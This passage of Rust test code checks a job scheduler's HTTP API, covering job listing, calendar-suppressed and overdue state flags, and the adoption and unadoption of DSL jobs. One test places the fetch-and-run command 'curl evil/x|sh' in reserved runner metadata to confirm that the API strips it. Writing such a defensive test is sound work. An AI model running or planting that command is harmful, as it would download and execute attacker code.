        let store = make_store();
        // One API-registered job in the store
        store
            .create_job_definition(&JobDefinition {
                job_key: "api:job".into(),
                description: None,
                assigned_runner_id: None,
                is_active: true,
                metadata: Default::default(),
                created_at: Utc::now(),
                updated_at: Utc::now(),
                timeout: None,
                max_retries: None,
                dead_letter_enabled: None,
                dead_letter_retention: None,
                dead_letter_operator_hint: None,
                dead_letter_replay_max_age: None,
                tags: vec![],
            })
            .unwrap();

        let state = make_state(vec![dsl_job("dsl:only")], store);
        let (status, body) = body_json(server_router(state), "GET", "/v1/jobs").await;

        assert_eq!(status, 200);
        let arr = body.as_array().unwrap();
        assert_eq!(arr.len(), 2);
        let keys: Vec<&str> = arr.iter().map(|j| j["job_key"].as_str().unwrap()).collect();
        assert!(keys.contains(&"api:job"));
        assert!(keys.contains(&"dsl:only"));
    }

    #[tokio::test]
    async fn job_states_surfaces_config_error() {
        use croniq_store::models::{JobState, JobStatus};
        let store = make_store();
        store
            .upsert_job_state(&JobState {
                job_key: "ops:tick".into(),
                next_fire_at: None,
                last_fired_at: None,
                fire_count: 0,
                status: JobStatus::Paused,
                updated_at: Utc::now(),
            })
            .unwrap();
        let state = make_state(vec![], store);
        state
            .config_faults
            .write()
            .unwrap()
            .insert("ops:tick".into(), "calendar 'biz' failed to compile".into());

        let (status, body) = body_json(server_router(state), "GET", "/v1/jobs/states").await;
        assert_eq!(status, 200);
        let row = body
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job_key"] == "ops:tick")
            .expect("job_states row present");
        assert!(
            row["config_error"]
                .as_str()
                .unwrap()
                .contains("failed to compile")
        );
    }

    // ─── suppressed_by: calendar-gated waiting state (#391) ───

    use std::collections::HashMap;

    /// Triggers whose calendar matches only a long-past date — the gate is
    /// deterministically closed "now", regardless of when the test runs.
    fn gated_trigger_map() -> HashMap<String, croniq_scheduler::trigger::Trigger> {
        crate::loader::load_str(
            r#"
            calendar oneoff { include annual 2020-01-01 }
            job ops:tick { every 1 minutes { calendar oneoff } }
            job plain:job { every 5 minutes }
            "#,
        )
        .unwrap()
        .triggers
    }

    fn make_state_with_triggers(
        store: DynStore,
        triggers: HashMap<String, croniq_scheduler::trigger::Trigger>,
    ) -> Arc<ServerState> {
        let mut state = make_state(vec![], store);
        {
            let s = Arc::get_mut(&mut state).unwrap();
            s.triggers = Some(Arc::new(RwLock::new(triggers)));
        }
        state
    }

    fn seed_active_state(store: &DynStore, key: &str, next_fire_at: chrono::DateTime<Utc>) {
        use croniq_store::models::{JobState, JobStatus};
        store
            .upsert_job_state(&JobState {
                job_key: key.into(),
                next_fire_at: Some(next_fire_at),
                last_fired_at: None,
                fire_count: 3,
                status: JobStatus::Active,
                updated_at: Utc::now(),
            })
            .unwrap();
    }

    #[tokio::test]
    async fn job_states_flags_calendar_suppressed_job() {
        let store = make_store();
        seed_active_state(&store, "ops:tick", Utc::now() + chrono::Duration::hours(1));
        let state = make_state_with_triggers(store, gated_trigger_map());

        let (status, body) = body_json(server_router(state), "GET", "/v1/jobs/states").await;
        assert_eq!(status, 200);
        let row = body
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job_key"] == "ops:tick")
            .expect("job_states row present");
        assert_eq!(row["overdue"], false);
        assert_eq!(row["suppressed_by"], "calendar 'oneoff'");
    }

    #[tokio::test]
    async fn job_states_overdue_wins_over_suppression() {
        // A genuinely stalled scheduler (past next_fire_at) must still read
        // as overdue — never as calmly waiting — even while the gate is
        // closed (#250 signal keeps priority).
        let store = make_store();
        seed_active_state(&store, "ops:tick", Utc::now() - chrono::Duration::hours(1));
        let state = make_state_with_triggers(store, gated_trigger_map());

        let (status, body) = body_json(server_router(state), "GET", "/v1/jobs/states").await;
        assert_eq!(status, 200);
        let row = body
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job_key"] == "ops:tick")
            .expect("job_states row present")
            .as_object()
            .unwrap();
        assert_eq!(row["overdue"], true);
        assert!(row.get("suppressed_by").is_none(), "serde must skip None");
    }

    #[tokio::test]
    async fn job_states_omits_suppressed_by_without_gate_or_snapshot() {
        // Job without a calendar/window gate → absent.
        let store = make_store();
        seed_active_state(&store, "plain:job", Utc::now() + chrono::Duration::hours(1));
        let state = make_state_with_triggers(store, gated_trigger_map());
        let (_, body) = body_json(server_router(state), "GET", "/v1/jobs/states").await;
        let row = body
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job_key"] == "plain:job")
            .unwrap()
            .as_object()
            .unwrap();
        assert!(row.get("suppressed_by").is_none());

        // No trigger snapshot at all (store-only mode) → absent.
        let store = make_store();
        seed_active_state(&store, "ops:tick", Utc::now() + chrono::Duration::hours(1));
        let state = make_state(vec![], store);
        let (_, body) = body_json(server_router(state), "GET", "/v1/jobs/states").await;
        let row = body
            .as_array()
            .unwrap()
            .iter()
            .find(|r| r["job_key"] == "ops:tick")
            .unwrap()
            .as_object()
            .unwrap();
        assert!(row.get("suppressed_by").is_none());
    }

    /// POST a JSON body and return (status, parsed body).
    async fn post_json(
        app: axum::Router,
        uri: &str,
        body: serde_json::Value,
    ) -> (u16, serde_json::Value) {
        let resp = app
            .oneshot(
                Request::builder()
                    .method("POST")
                    .uri(uri)
                    .header("content-type", "application/json")
                    .body(Body::from(body.to_string()))
                    .unwrap(),
            )
            .await
            .unwrap();
        let status = resp.status().as_u16();
        let bytes = resp.into_body().collect().await.unwrap().to_bytes();
        let json = serde_json::from_slice(&bytes).unwrap_or(serde_json::Value::Null);
        (status, json)
    }

    #[tokio::test]
    async fn create_job_strips_reserved_metadata_namespace() {
        // The `__` namespace is scheduler-owned: `__runner_exec` is what the
        // shell runner spawns, `__require` / `__max_concurrent` drive routing
        // and the concurrency guard. A `jobs:write` caller must not be able to
        // persist those onto a stored job definition, even though the loader
        // drops stored metadata on the way to the scheduler today.
        use croniq_config::compile::RUNNER_EXEC_METADATA_KEY;

        let store = make_store();
        let state = make_state(vec![], Arc::clone(&store));

        let (status, body) = post_json(
            server_router(state),
            "/v1/jobs",
            serde_json::json!({
                "job_key": "api:created",
                "metadata": {
                    RUNNER_EXEC_METADATA_KEY: "{\"kind\":\"shell\",\"command\":\"curl evil/x|sh\"}",
                    "__max_concurrent": "999",
                    "env": "staging"
                }
            }),
        )
        .await;

        assert_eq!(status, 201);
        assert!(body["metadata"].get(RUNNER_EXEC_METADATA_KEY).is_none());
        assert!(body["metadata"].get("__max_concurrent").is_none());
        assert_eq!(body["metadata"]["env"], "staging");

        // And nothing reserved made it into the persisted row either.
        let stored = store
            .get_job_definition("api:created")
            .unwrap()
            .expect("job should be stored");
        assert!(!stored.metadata.contains_key(RUNNER_EXEC_METADATA_KEY));
        assert!(!stored.metadata.contains_key("__max_concurrent"));
        assert_eq!(stored.metadata["env"], "staging");
    }

    #[tokio::test]
    async fn get_job_falls_back_to_dsl() {
        let state = make_state(vec![dsl_job("demo:slow-job")], make_store());
        let (status, body) = body_json(server_router(state), "GET", "/v1/jobs/demo:slow-job").await;
        assert_eq!(status, 200);
        assert_eq!(body["job_key"], "demo:slow-job");
    }

    #[tokio::test]
    async fn delete_dsl_job_returns_409() {
        let state = make_state(vec![dsl_job("dsl:locked")], make_store());
        let status = status_of(server_router(state), "DELETE", "/v1/jobs/dsl:locked").await;
        assert_eq!(status, 409);
    }

    #[tokio::test]
    async fn deactivate_dsl_job_returns_409() {
        let state = make_state(vec![dsl_job("dsl:locked")], make_store());
        let status = status_of(
            server_router(state),
            "POST",
            "/v1/jobs/dsl:locked/deactivate",
        )
        .await;
        assert_eq!(status, 409);
    }

    // ─── Adoption (Phase 2.5) ─────────────────────────────────────────────

    fn make_state_with_policy(
        dsl: Vec<JobConfig>,
        store: DynStore,
        adopt: bool,
    ) -> Arc<ServerState> {
        let state = make_state(dsl, store);
        state
            .policy_dsl_adopt_on_mutate
            .store(adopt, std::sync::atomic::Ordering::Relaxed);
        state
    }

    /// Like `make_state_with_policy` but keeps the scheduler receiver alive so
    /// a test can observe the commands the handler pushes (the default
    /// `make_state` drops the receiver, silently discarding them).
    fn make_state_keep_rx(
        dsl: Vec<JobConfig>,
        store: DynStore,
        adopt: bool,
    ) -> (
        Arc<ServerState>,
        mpsc::UnboundedReceiver<crate::scheduler::SchedulerCommand>,
    ) {
        let runner = AppState::new();
        let (comp_tx, _comp_rx) = mpsc::unbounded_channel();
        let (sched_tx, sched_rx) = mpsc::unbounded_channel();
        let mut state = ServerState::with_auth(runner, comp_tx, None, Some(store));
        {
            let s = Arc::get_mut(&mut state).unwrap();
            s.dsl_jobs = Some(Arc::new(RwLock::new(dsl)));
            s.scheduler_tx = Some(sched_tx);
        }
        state
            .policy_dsl_adopt_on_mutate
            .store(adopt, std::sync::atomic::Ordering::Relaxed);
        (state, sched_rx)
    }

    fn dsl_job_sched(key: &str, sched: &str) -> JobConfig {
        crate::loader::load_str(&format!("job {key} {{ {sched} }}"))
            .unwrap()
            .runtime
            .jobs
            .pop()
            .unwrap()
    }

    #[tokio::test]
    async fn adopt_job_returns_409_when_policy_off() {
        let state = make_state(vec![dsl_job("billing:invoice")], make_store());
        let (status, body) = body_json(
            server_router(state),
            "POST",
            "/v1/jobs/billing:invoice/adopt",
        )
        .await;
        assert_eq!(status, 409);
        assert_eq!(body["error"], "adoption_disabled");
    }

    #[tokio::test]
    async fn adopt_job_succeeds_when_policy_on() {
        let store = make_store();
        let state =
            make_state_with_policy(vec![dsl_job("billing:invoice")], Arc::clone(&store), true);

        let (status, body) = body_json(
            server_router(Arc::clone(&state)),
            "POST",
            "/v1/jobs/billing:invoice/adopt",
        )
        .await;
        assert_eq!(status, 200);
        assert_eq!(body["dsl_key"], "billing:invoice");
        assert_eq!(body["job"]["job_key"], "billing:invoice");
        assert_eq!(body["trigger"]["job_key"], "billing:invoice");
        assert_eq!(body["trigger"]["managed_by"], "api");

        // Adoption row exists and the API records are in the store.
        assert!(store.is_adopted("job", "billing:invoice").unwrap());
        assert!(
            store
                .get_job_definition("billing:invoice")
                .unwrap()
                .is_some()
        );
        let triggers = store.list_triggers(Some("billing:invoice")).unwrap();
        assert_eq!(triggers.len(), 1);
        assert_eq!(triggers[0].managed_by, "api");

        // The DSL snapshot dropped the adopted entry.
        let dsl = state.dsl_jobs.as_ref().unwrap().read().await;
        assert!(dsl.iter().all(|j| j.key != "billing:invoice"));
    }

    #[tokio::test]
    async fn adopt_pushes_addjob_for_every_schedule_shape() {
        // Adopting a DSL job must push an AddJob to the live scheduler so the
        // job keeps firing without waiting for a reload. The #393-adjacent bug
        // was that the pushed `cron_expression` held the human summary, which
        // `trigger_from_definition` could only rebuild for intervals — so even
        // interval jobs pushed nothing on some paths, and daily/weekly/once
        // jobs never did.
        for (key, sched) in [
            ("iv:tick", "every 5 minutes"),
            ("dl:report", "every day at 02:00"),
            ("wk:run", "every monday friday at 09:00"),
            ("on:migrate", r#"once at "2999-01-01T00:00:00Z""#),
        ] {
            let store = make_store();
            let (state, mut rx) =
                make_state_keep_rx(vec![dsl_job_sched(key, sched)], Arc::clone(&store), true);

            let (status, _) = body_json(
                server_router(Arc::clone(&state)),
                "POST",
                &format!("/v1/jobs/{key}/adopt"),
            )
            .await;
            assert_eq!(status, 200, "{sched}: adopt failed");

            let cmd = rx
                .try_recv()
                .unwrap_or_else(|_| panic!("{sched}: no scheduler command pushed"));
            match cmd {
                crate::scheduler::SchedulerCommand::AddJob { job, trigger } => {
                    assert_eq!(job.key, key, "{sched}: wrong job pushed");
                    assert!(
                        trigger.next_fire_at.is_some(),
                        "{sched}: pushed trigger has no next fire time"
                    );
                }
                _ => panic!("{sched}: expected an AddJob command"),
            }
        }
    }

    #[tokio::test]
    async fn unadopt_job_clears_api_records_and_adoption() {
        let store = make_store();
        let state =
            make_state_with_policy(vec![dsl_job("billing:invoice")], Arc::clone(&store), true);

        // Adopt first.
        let (s1, _) = body_json(
            server_router(Arc::clone(&state)),
            "POST",
            "/v1/jobs/billing:invoice/adopt",
        )
        .await;
        assert_eq!(s1, 200);

        // Unadopt.
        let s2 = status_of(
            server_router(Arc::clone(&state)),
            "POST",
            "/v1/jobs/billing:invoice/unadopt",
        )
        .await;
        assert_eq!(s2, 204);

        // Store side-effects undone.
        assert!(!store.is_adopted("job", "billing:invoice").unwrap());
        assert!(
            store
                .get_job_definition("billing:invoice")
                .unwrap()
                .is_none()
        );
        let triggers = store.list_triggers(Some("billing:invoice")).unwrap();
        assert!(triggers.is_empty());
    }

    #[tokio::test]
    async fn unadopt_returns_409_for_non_adopted_job() {
        let store = make_store();
        // Seed a regular API job that was never adopted.
        store
            .create_job_definition(&JobDefinition {
                job_key: "api:regular".into(),
                description: None,
                assigned_runner_id: None,
                is_active: true,
                metadata: Default::default(),
                created_at: Utc::now(),
                updated_at: Utc::now(),
                timeout: None,
                max_retries: None,
                dead_letter_enabled: None,
                dead_letter_retention: None,
                dead_letter_operator_hint: None,
                dead_letter_replay_max_age: None,
                tags: vec![],
            })
            .unwrap();
        let state = make_state_with_policy(vec![], Arc::clone(&store), true);

        let (status, body) =
            body_json(server_router(state), "POST", "/v1/jobs/api:regular/unadopt").await;
        assert_eq!(status, 409);
        assert_eq!(body["error"], "not_adopted");
    }

    #[tokio::test]
    async fn adopt_returns_404_for_unknown_dsl_key() {
        let state = make_state_with_policy(vec![dsl_job("only:one")], make_store(), true);
        let (status, body) =
            body_json(server_router(state), "POST", "/v1/jobs/missing:job/adopt").await;
        assert_eq!(status, 404);
        assert_eq!(body["error"], "not_found");
    }
}
